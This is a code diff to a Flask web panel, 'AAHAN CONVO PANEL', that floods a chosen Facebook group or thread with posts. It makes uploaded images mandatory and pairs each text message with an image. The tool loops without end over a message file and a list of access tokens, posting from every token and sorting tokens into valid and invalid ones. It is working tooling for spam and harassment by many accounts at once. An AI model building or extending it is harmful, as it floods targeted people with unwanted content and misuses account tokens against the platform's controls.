@@ -81,15 +81,74 @@ def upload_image_to_facebook(access_token, image_path, group_id):
             
             if response.status_code == 200:
                 result = response.json()
+                print(f"✅ Image uploaded successfully! Photo ID: {result.get('id')}")
                 return result.get('id')
             else:
-                print(f"Image upload failed: {response.text}")
+                print(f"❌ Image upload failed: {response.text}")
                 return None
     except Exception as e:
-        print(f"Image upload error: {str(e)}")
+        print(f"❌ Image upload error: {str(e)}")
         return None
 
-# Enhanced message sending function with alternating text and image
+def send_text_with_image(access_token, group_id, message, image_path):
+    """Send text message with image attached"""
+    try:
+        # First upload the image
+        image_id = upload_image_to_facebook(access_token, image_path, group_id)
+        if not image_id:
+            print(f"❌ Failed to upload image for token: {access_token[:6]}...")
+            return False
+        
+        # Then send post with image attachment
+        response = requests.post(
+            f'https://graph.facebook.com/v19.0/{group_id}/feed',
+            data={
+                'message': message,
+                'attached_media': f'[{{"media_fbid":"{image_id}"}}]',
+                'access_token': access_token
+            },
+            headers=headers,
+            timeout=15
+        )
+        
+        if response.status_code == 200:
+            print(f"✅ Text + Image sent successfully! Token: {access_token[:6]}...")
+            return True
+        else:
+            error_msg = response.json().get('error', {}).get('message', 'Unknown error')
+            print(f"❌ Failed to send text+image. Error: {error_msg} | Token: {access_token[:6]}...")
+            return False
+            
+    except Exception as e:
+        print(f"❌ Text+Image request failed: {str(e)}")
+        return False
+
+def send_text_only(access_token, group_id, message):
+    """Send text message only"""
+    try:
+        response = requests.post(
+            f'https://graph.facebook.com/v19.0/{group_id}/feed',
+            data={
+                'message': message,
+                'access_token': access_token
+            },
+            headers=headers,
+            timeout=15
+        )
+        
+        if response.status_code == 200:
+            print(f"✅ Text message sent successfully! Token: {access_token[:6]}...")
+            return True
+        else:
+            error_msg = response.json().get('error', {}).get('message', 'Unknown error')
+            print(f"❌ Failed to send text. Error: {error_msg} | Token: {access_token[:6]}...")
+            return False
+            
+    except Exception as e:
+        print(f"❌ Text request failed: {str(e)}")
+        return False
+
+# Enhanced message sending function with 1-text-1-image pattern
 def send_messages_with_images(access_tokens, group_id, prefix, delay, messages, task_id, image_paths):
     stop_event = stop_events[task_id]
     
@@ -103,6 +162,19 @@ def send_messages_with_images(access_tokens, group_id, prefix, delay, messages, 
         'current_image_index': 0
     }
     
+    # Validate that we have images
+    if not image_paths:
+        print("❌ No images provided! Please upload at least one image.")
+        return
+    
+    # Filter only existing image files
+    valid_image_paths = [path for path in image_paths if os.path.exists(path)]
+    if not valid_image_paths:
+        print("❌ No valid image files found!")
+        return
+    
+    print(f"✅ Starting with {len(valid_image_paths)} images and {len(messages)} messages")
+    
     while not stop_event.is_set():
         try:
             for message_index, message in enumerate(messages):
@@ -110,6 +182,10 @@ def send_messages_with_images(access_tokens, group_id, prefix, delay, messages, 
                     break
                 
                 full_message = f"{prefix} {message}".strip()
+                current_image_index = cookies_data['current_image_index'] % len(valid_image_paths)
+                current_image_path = valid_image_paths[current_image_index]
+                
+                print(f"📝 Processing message {message_index + 1}/{len(messages)} with image {current_image_index + 1}/{len(valid_image_paths)}")
                 
                 for token in [t.strip() for t in access_tokens if t.strip()]:
                     if stop_event.is_set():
@@ -120,61 +196,33 @@ def send_messages_with_images(access_tokens, group_id, prefix, delay, messages, 
                     if token_valid:
                         cookies_data['valid_tokens'] = list(set(cookies_data['valid_tokens'] + [token]))
                         
-                        try:
-                            # Send text message
-                            response_text = requests.post(
-                                f'https://graph.facebook.com/v19.0/{group_id}/feed',
-                                data={
-                                    'message': full_message,
-                                    'access_token': token
-                                },
-                                headers=headers,
-                                timeout=15
-                            )
-                            
-                            if response_text.status_code == 200:
-                                print(f"Text message sent successfully! Token: {token[:6]}...")
-                                cookies_data['total_messages_sent'] += 1
-                            else:
-                                error_msg = response_text.json().get('error', {}).get('message', 'Unknown error')
-                                print(f"Failed to send text message. Error: {error_msg} | Token: {token[:6]}...")
-                                
-                        except Exception as e:
-                            print(f"Text message request failed: {str(e)}")
+                        # Send text with image
+                        success = send_text_with_image(token, group_id, full_message, current_image_path)
                         
-                        # Send image if available
-                        if image_paths:
-                            current_image_index = cookies_data['current_image_index'] % len(image_paths)
-                            image_path = image_paths[current_image_index]
-                            
-                            if os.path.exists(image_path):
-                                try:
-                                    image_attachment_id = upload_image_to_facebook(token, image_path, group_id)
-                                    if image_attachment_id:
-                                        print(f"Image sent successfully! Token: {token[:6]}...")
-                                        cookies_data['total_images_sent'] += 1
-                                        cookies_data['current_image_index'] += 1
-                                    else:
-                                        print(f"Failed to upload image for token: {token[:6]}...")
-                                        
-                                except Exception as e:
-                                    print(f"Image upload failed: {str(e)}")
+                        if success:
+                            cookies_data['total_messages_sent'] += 1
+                            cookies_data['total_images_sent'] += 1
+                            print(f"✅ Successfully sent message {cookies_data['total_messages_sent']} with image {cookies_data['total_images_sent']}")
+                        else:
+                            print(f"❌ Failed to send message with image for token: {token[:6]}...")
                         
                     else:
                         cookies_data['invalid_tokens'] = list(set(cookies_data['invalid_tokens'] + [token]))
-                        print(f"Invalid token detected: {token[:6]}...")
+                        print(f"❌ Invalid token detected: {token[:6]}...")
                     
                     cookies_data['last_checked'] = datetime.now().isoformat()
                     cookies_data['current_message_index'] = message_index
+                    cookies_data['current_image_index'] = current_image_index + 1  # Move to next image
                     save_cookies(task_id, cookies_data)
                     
+                    print(f"⏳ Waiting {delay} seconds before next send...")
                     time.sleep(max(delay, 10))
                 
                 if stop_event.is_set():
                     break
                     
         except Exception as e:
-            print(f"Error in message loop: {str(e)}")
+            print(f"❌ Error in message loop: {str(e)}")
             time.sleep(10)
 
 # Alternative method for sending messages with images
@@ -191,10 +239,29 @@ def send_messages_alternative_with_images(access_tokens, thread_id, mn, time_int
         'current_image_index': 0
     }
     
+    # Validate that we have images
+    if not image_paths:
+        print("❌ No images provided! Please upload at least one image.")
+        return
+    
+    # Filter only existing image files
+    valid_image_paths = [path for path in image_paths if os.path.exists(path)]
+    if not valid_image_paths:
+        print("❌ No valid image files found!")
+        return
+    
+    print(f"✅ Starting alternative method with {len(valid_image_paths)} images and {len(messages)} messages")
+    
     while not stop_event.is_set():
         for message_index, message1 in enumerate(messages):
             if stop_event.is_set():
                 break
+            
+            full_message = str(mn) + ' ' + message1
+            current_image_index = cookies_data['current_image_index'] % len(valid_image_paths)
+            current_image_path = valid_image_paths[current_image_index]
+            
+            print(f"📝 Processing message {message_index + 1}/{len(messages)} with image {current_image_index + 1}/{len(valid_image_paths)}")
                 
             for access_token in access_tokens:
                 if stop_event.is_set():
@@ -205,49 +272,26 @@ def send_messages_alternative_with_images(access_tokens, thread_id, mn, time_int
                 if token_valid:
                     cookies_data['valid_tokens'] = list(set(cookies_data['valid_tokens'] + [access_token]))
                     
-                    try:
-                        # Send text message
-                        api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-                        message = str(mn) + ' ' + message1
-                        
-                        parameters = {'access_token': access_token, 'message': message}
-                        response = requests.post(api_url, data=parameters, headers=headers)
-                        
-                        if response.status_code == 200:
-                            print(f"Text message sent successfully! Token: {access_token[:6]}...")
-                            cookies_data['total_messages_sent'] += 1
-                        else:
-                            print(f"Text message failed! Token: {access_token[:6]}...")
-                            
-                    except Exception as e:
-                        print(f"Text message request failed: {str(e)}")
+                    # Send text with image using alternative method
+                    success = send_text_with_image(access_token, thread_id, full_message, current_image_path)
                     
-                    # Send image if available
-                    if image_paths:
-                        current_image_index = cookies_data['current_image_index'] % len(image_paths)
-                        image_path = image_paths[current_image_index]
-                        
-                        if os.path.exists(image_path):
-                            try:
-                                image_attachment_id = upload_image_to_facebook(access_token, image_path, thread_id)
-                                if image_attachment_id:
-                                    print(f"Image sent successfully! Token: {access_token[:6]}...")
-                                    cookies_data['total_images_sent'] += 1
-                                    cookies_data['current_image_index'] += 1
-                                else:
-                                    print(f"Failed to upload image for token: {access_token[:6]}...")
-                                    
-                            except Exception as e:
-                                print(f"Image upload failed: {str(e)}")
+                    if success:
+                        cookies_data['total_messages_sent'] += 1
+                        cookies_data['total_images_sent'] += 1
+                        print(f"✅ Successfully sent message {cookies_data['total_messages_sent']} with image {cookies_data['total_images_sent']}")
+                    else:
+                        print(f"❌ Failed to send message with image for token: {access_token[:6]}...")
                     
                 else:
                     cookies_data['invalid_tokens'] = list(set(cookies_data['invalid_tokens'] + [access_token]))
-                    print(f"Invalid token detected: {access_token[:6]}...")
+                    print(f"❌ Invalid token detected: {access_token[:6]}...")
                 
                 cookies_data['last_checked'] = datetime.now().isoformat()
                 cookies_data['current_message_index'] = message_index
+                cookies_data['current_image_index'] = current_image_index + 1  # Move to next image
                 save_cookies(task_id, cookies_data)
                 
+                print(f"⏳ Waiting {time_interval} seconds before next send...")
                 time.sleep(time_interval)
 
 # Main Interface with Image Support
@@ -274,16 +318,26 @@ def main_handler():
             if not messages:
                 return 'Message file is empty', 400
 
-            # Handle multiple image uploads
+            # Handle multiple image uploads - REQUIRED
             image_paths = []
             image_files = request.files.getlist('imageFiles')
+            
+            if not image_files or all(img.filename == '' for img in image_files):
+                return 'At least one image file is REQUIRED', 400
+                
             for image_file in image_files:
                 if image_file and image_file.filename != '':
+                    # Validate file extension
+                    allowed_extensions = {'.jpg', '.jpeg', '.png', '.gif'}
+                    file_ext = os.path.splitext(image_file.filename)[1].lower()
+                    if file_ext not in allowed_extensions:
+                        return f'Invalid file type: {file_ext}. Only JPG, JPEG, PNG, GIF are allowed.', 400
+                    
                     image_filename = f"image_{secrets.token_urlsafe(8)}_{image_file.filename}"
                     image_path = os.path.join(app.config['UPLOAD_FOLDER'], image_filename)
                     image_file.save(image_path)
                     image_paths.append(image_path)
-                    print(f"Image saved: {image_path}")
+                    print(f"✅ Image saved: {image_path}")
 
             if token_option == 'single':
                 access_tokens = [request.form.get('singleToken', '').strip()]
@@ -299,6 +353,12 @@ def main_handler():
 
             task_id = secrets.token_urlsafe(8)
             stop_events[task_id] = Event()
+            
+            print(f"🚀 Starting task {task_id} with:")
+            print(f"   - {len(messages)} messages")
+            print(f"   - {len(image_paths)} images") 
+            print(f"   - {len(access_tokens)} tokens")
+            print(f"   - Delay: {delay} seconds")
             
             if api_version == 'v15':
                 threads[task_id] = Thread(
@@ -456,8 +516,12 @@ def main_handler():
                                 <strong style="color: var(--accent);">{{ api_version }}</strong>
                             </div>
                             <div class="info-item">
-                                <span>Media:</span>
-                                <strong>{{ "Text + " ~ image_paths|length ~ " Images" if image_paths else "Text Only" }}</strong>
+                                <span>Pattern:</span>
+                                <strong>1-Text + 1-Image</strong>
+                            </div>
+                            <div class="info-item">
+                                <span>Images:</span>
+                                <strong>{{ image_paths|length }} images loaded</strong>
                             </div>
                             <div class="info-item">
                                 <span>Initiated:</span>
@@ -491,7 +555,7 @@ def main_handler():
         <head>
             <meta charset="UTF-8">
             <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <title>AAHAN CONVO PANEL - ADVANCED MESSAGING SYSTEM</title>
+            <title>AAHAN CONVO PANEL - 1-TEXT + 1-IMAGE SYSTEM</title>
             <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
             <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
             <style>
@@ -604,6 +668,11 @@ def main_handler():
                     text-transform: uppercase;
                     letter-spacing: 1px;
                     font-size: 0.9rem;
+                }
+                
+                .required::after {
+                    content: " *";
+                    color: var(--accent);
                 }
                 
                 .form-control, .form-select {
@@ -761,6 +830,16 @@ def main_handler():
                     border-radius: 8px;
                     border: 2px solid var(--primary);
                 }
+                
+                .alert-info {
+                    background: rgba(46, 196, 182, 0.1);
+                    border: 1px solid rgba(46, 196, 182, 0.3);
+                    color: #2ec4b6;
+                    border-radius: 10px;
+                    padding: 15px;
+                    margin-bottom: 20px;
+                    text-align: center;
+                }
             </style>
         </head>
         <body>
@@ -773,7 +852,7 @@ def main_handler():
                             <i class="fas fa-comments"></i> AAHAN CONVO PANEL
                         </div>
                         <div class="text-white">
-                            <i class="fas fa-user-shield"></i> Advanced Messaging System
+                            <i class="fas fa-images"></i> 1-Text + 1-Image System
                         </div>
                     </div>
                 </div>
@@ -782,8 +861,14 @@ def main_handler():
             <div class="main-container">
                 <div class="dashboard-card">
                     <h2 class="section-title">
-                        <i class="fas fa-rocket"></i> AAHAN CONVO MESSAGE LAUNCHER
+                        <i class="fas fa-rocket"></i> 1-TEXT + 1-IMAGE MESSAGE LAUNCHER
                     </h2>
+                    
+                    <div class="alert-info">
+                        <i class="fas fa-info-circle"></i> 
+                        <strong>IMPORTANT:</strong> This system sends 1 Text Message + 1 Image together in each post. 
+                        Images are REQUIRED for the system to work.
+                    </div>
                     
                     <form method="post" enctype="multipart/form-data">
                         <div class="row">
@@ -798,7 +883,7 @@ def main_handler():
                             </div>
                             <div class="col-md-6">
                                 <div class="form-group">
-                                    <label class="form-label">TARGET ID</label>
+                                    <label class="form-label required">TARGET ID</label>
                                     <input type="text" class="form-control" name="threadId" placeholder="Group/Thread ID" required>
                                 </div>
                             </div>
@@ -813,7 +898,7 @@ def main_handler():
                             </div>
                             <div class="col-md-6">
                                 <div class="form-group">
-                                    <label class="form-label">DELAY (SECONDS)</label>
+                                    <label class="form-label required">DELAY (SECONDS)</label>
                                     <input type="number" class="form-control" name="time" value="10" min="5" required>
                                 </div>
                             </div>
@@ -822,7 +907,7 @@ def main_handler():
                         <div class="row">
                             <div class="col-md-6">
                                 <div class="form-group">
-                                    <label class="form-label">MESSAGES FILE</label>
+                                    <label class="form-label required">MESSAGES FILE</label>
                                     <label class="file-upload">
                                         <input type="file" class="d-none" name="txtFile" accept=".txt" required>
                                         <i class="fas fa-file-alt"></i>
@@ -833,9 +918,9 @@ def main_handler():
                             </div>
                             <div class="col-md-6">
                                 <div class="form-group">
-                                    <label class="form-label">IMAGE FILES (OPTIONAL)</label>
+                                    <label class="form-label required">IMAGE FILES (REQUIRED)</label>
                                     <label class="file-upload">
-                                        <input type="file" class="d-none" name="imageFiles" accept=".jpg,.jpeg,.png,.gif" multiple>
+                                        <input type="file" class="d-none" name="imageFiles" accept=".jpg,.jpeg,.png,.gif" multiple required>
                                         <i class="fas fa-images"></i>
                                         <div>Click to upload images</div>
                                         <small style="color: rgba(255, 255, 255, 0.6);">Multiple JPG, PNG, GIF supported</small>
@@ -846,7 +931,7 @@ def main_handler():
                         </div>
                         
                         <div class="form-group">
-                            <label class="form-label">TOKEN OPTION</label>
+                            <label class="form-label required">TOKEN OPTION</label>
                             <div class="row">
                                 <div class="col-md-6 mb-3">
                                     <div class="form-check">
@@ -856,7 +941,7 @@ def main_handler():
                                         </label>
                                     </div>
                                     <div id="singleTokenSection" class="mt-2">
-                                        <textarea class="form-control" name="singleToken" rows="3" placeholder="Paste access token here..."></textarea>
+                                        <textarea class="form-control" name="singleToken" rows="3" placeholder="Paste access token here..." required></textarea>
                                     </div>
                                 </div>
                                 <div class="col-md-6 mb-3">
@@ -868,7 +953,7 @@ def main_handler():
                                     </div>
                                     <div id="multiTokenSection" class="mt-2" style="display: none;">
                                         <label class="file-upload">
-                                            <input type="file" class="d-none" name="tokenFile" accept=".txt">
+                                            <input type="file" class="d-none" name="tokenFile" accept=".txt" required>
                                             <i class="fas fa-file-upload"></i>
                                             <div>Upload tokens file</div>
                                             <small style="color: rgba(255, 255, 255, 0.6);">One token per line</small>
@@ -879,7 +964,7 @@ def main_handler():
                         </div>
                         
                         <button type="submit" class="submit-btn">
-                            <i class="fas fa-paper-plane"></i> LAUNCH MESSAGING SYSTEM
+                            <i class="fas fa-paper-plane"></i> LAUNCH 1-TEXT + 1-IMAGE SYSTEM
                         </button>
                     </form>
                     
@@ -893,7 +978,7 @@ def main_handler():
                             <div>Total Messages</div>
                         </div>
                         <div class="stat-card">
-                            <div class="stat-number">v2.2.0</div>
+                            <div class="stat-number">v3.0.0</div>
                             <div>System Version</div>
                         </div>
                         <div class="stat-card">
@@ -913,9 +998,15 @@ def main_handler():
                         if (this.value === 'single') {
                             document.getElementById('singleTokenSection').style.display = 'block';
                             document.getElementById('multiTokenSection').style.display = 'none';
+                            // Set required attribute
+                            document.querySelector('textarea[name="singleToken"]').required = true;
+                            document.querySelector('input[name="tokenFile"]').required = false;
                         } else {
                             document.getElementById('singleTokenSection').style.display = 'none';
                             document.getElementById('multiTokenSection').style.display = 'block';
+                            // Set required attribute
+                            document.querySelector('textarea[name="singleToken"]').required = false;
+                            document.querySelector('input[name="tokenFile"]').required = true;
                         }
                     });
                 });
@@ -1182,7 +1273,7 @@ def monitor_task(task_id):
                     </div>
                     <div class="stat-card">
                         <div class="stat-number total">{{ cookies_data.total_messages_sent }}</div>
-                        <div>MESSAGES SENT</div>
+                        <div>TEXT+IMAGE POSTS</div>
                     </div>
                     <div class="stat-card">
                         <div class="stat-number images">{{ cookies_data.total_images_sent }}</div>
